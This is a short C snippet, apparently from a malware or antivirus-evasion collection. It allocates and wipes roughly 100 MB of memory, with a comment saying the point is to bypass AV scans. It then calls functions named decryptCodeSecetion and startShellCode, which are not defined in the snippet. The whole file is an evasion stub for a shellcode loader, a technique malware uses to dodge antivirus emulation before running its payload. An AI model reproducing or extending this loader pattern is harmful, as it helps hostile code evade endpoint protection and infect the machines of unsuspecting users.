// Memory Allocation
//Attempts to create a large segmant of memory to bypass AV scans

#define LOTS_OF_MEMORY 100000000

int main() {
	char * memdmp = NULL;
	memdmp = (char *)malloc(LOTS_OF_MEMORY);

	if (memdmp != NULL) {
		memset(memdmp, 00, LOTS_OF_MEMORY);
		free(memdmp);
		decryptCodeSecetion();
		startShellCode();
	}

	return 0;
}